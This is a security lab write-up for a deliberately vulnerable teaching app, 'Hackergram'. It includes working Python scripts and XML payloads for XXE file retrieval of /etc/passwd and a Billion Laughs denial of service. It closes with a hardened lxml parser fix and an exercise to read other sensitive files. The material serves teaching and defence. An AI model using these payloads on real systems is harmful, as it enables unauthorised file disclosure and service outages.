# XXE Injection

## Objective

This experiment demonstrates that Hackergram's XML parser on the `/posts` endpoint resolves external
entities, letting an attacker read arbitrary files off the server (`file://` entity) or exhaust its resources
with a recursively expanding entity ("Billion Laughs"), purely through a crafted XML post body.

## Affected Hackergram functionality

- `/posts` (POST, XML content type): accepts structured API-style XML submissions in addition to normal
  form data.

## Prerequisites

Simple/local deployment. Both sub-attacks are delivered via a Python script run from the attacker machine.

## Initial state

Run `/reset` first, then register and log in as a throwaway user (the scripts do this automatically).

## Vulnerable implementation

XML support was added to `/posts` to accommodate structured API-style requests alongside normal form
submissions. While the framework handles form data automatically, the XML path required explicit parsing,
and the parser was left in a permissive configuration that allows external entity resolution and `DOCTYPE`
processing, which is the classic precondition for XXE.

A typical malicious payload embeds a `<!DOCTYPE>` declaration that defines an external entity:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

If the parser resolves `&xxe;`, the referenced file is incorporated into the parsed document and can be
exposed through the application's response.

## Experiment

### File retrieval attack

The attacker submits a crafted XML document to `/posts` containing a `<!DOCTYPE>` declaration that defines an
external entity referencing `/etc/passwd`. The parser expands the entity, reading the file and incorporating
its contents into the parsed output; the script then extracts the leaked data from the response.

??? note "File Retrieval Attack Script"

    ```py
    import requests
    import sys
    from lxml import etree

    def reset(session):
        session.get(SERVER + "/reset")

    def register(session):
        payload = {
            'username': "mallory",
            'name': "Mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/signup", data=payload)

    def login(session):
        payload = {
            'username': "mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/login", data=payload)

    def exploit(session):
        xml_payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <post>
    <content>&xxe;</content>
    </post>"""

        headers = {'Content-Type': 'application/xml'}
        r = session.post(SERVER + "/posts", data=xml_payload, headers=headers)
        print("Server response:")
        print(r.text)

    if __name__ == '__main__':
        host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
        port = '80' if len(sys.argv) < 3 else sys.argv[2]
        SERVER = "http://" + host + ":" + port
        print(SERVER)
        print("--------------------------------------\n")
        with requests.session() as s:
            reset(s)
            register(s)
            login(s)
            exploit(s)
    ```

### Billion Laughs denial of service

This attack exploits the parser's handling of recursively defined XML entities. The attacker submits an XML
payload containing a chain of nested entities, each expanding into a progressively larger value:

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>
  <query>&lol9;</query>
</root>
```

??? note "Billion Laughs Denial of Service Script"

    ```py
    import requests
    import sys

    def reset(session):
        session.get(SERVER + "/reset")

    def register(session):
        payload = {
            'username': "mallory",
            'name': "Mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/signup", data=payload)

    def login(session):
        payload = {
            'username': "mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/login", data=payload)

    def exploit(session):
        xml_payload = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <root>
    <query>&lol9;</query>
    </root>"""

        headers = {'Content-Type': 'application/xml'}
        print("Sending Billion Laughs payload...")
        try:
            r = session.post(SERVER + "/posts", data=xml_payload, headers=headers, timeout=10)
            print(f"Response status: {r.status_code}")
        except requests.exceptions.Timeout:
            print("Request timed out — server may be overwhelmed.")
        except requests.exceptions.ConnectionError:
            print("Connection failed — server may be down.")

    if __name__ == '__main__':
        host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
        port = '80' if len(sys.argv) < 3 else sys.argv[2]
        SERVER = "http://" + host + ":" + port
        print(SERVER)
        print("--------------------------------------\n")
        with requests.session() as s:
            reset(s)
            register(s)
            login(s)
            exploit(s)
    ```

## Expected result

- File retrieval: the server's response includes the contents of `/etc/passwd`.
- Billion Laughs: as the parser attempts to resolve `&lol9;` (which depends on all preceding entities),
  memory/CPU usage on the server spikes, the application becomes unresponsive, and the request eventually
  times out or the connection fails. Subsequent requests fail while the service recovers.

## Why it works

XXE attacks don't rely on application-level logic, only on the XML parser's willingness to interpret
attacker-controlled structure. Because the parser used for `/posts`' XML path is left in its default
permissive configuration, `<!DOCTYPE>` declarations and the entities they define are processed rather than
rejected, so `&xxe;` gets expanded into file contents, and `&lol9;` gets expanded into an exponentially
large string.

!!! note "Broader context"

    SQL injection, NoSQL injection, and XXE are all parser-driven attacks: they arise when attacker-controlled
    input is incorporated into a structured construct before parsing, allowing the attacker to alter query
    logic, introduce operators, or trigger entity resolution.

## Reset / cleanup

Run `/reset` to restore Hackergram to a clean state (important after the Billion Laughs attack, which may
leave the application unresponsive until it recovers or is restarted).

## Inspect and modify

XXE is eliminated by configuring the XML parser to disallow external entity resolution and `DOCTYPE`
declarations entirely. In Python's `lxml`, pass a restricted `XMLParser`:

```py
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
tree = etree.fromstring(xml_data, parser)
```

`resolve_entities=False` makes the parser treat entity references as plain text instead of expanding them,
neutralizing both the file-retrieval and Billion Laughs payloads. `no_network=True` prevents the parser from
issuing outbound requests for remote entities, and `load_dtd=False` blocks `DOCTYPE` declarations from being
processed at all. Apply this to the `/posts` XML-parsing path, repeat both attacks, and confirm the entity is
no longer expanded.

## Exercise

Modify the file-retrieval script to target a different sensitive file on the Hackergram host (for example,
the application's own source file) instead of `/etc/passwd`.

## Hint

<details>
<summary>💡 Hint</summary>

Any file the application process can read is fair game, so try the app's own entry point, or a configuration
file that might contain database credentials.

</details>
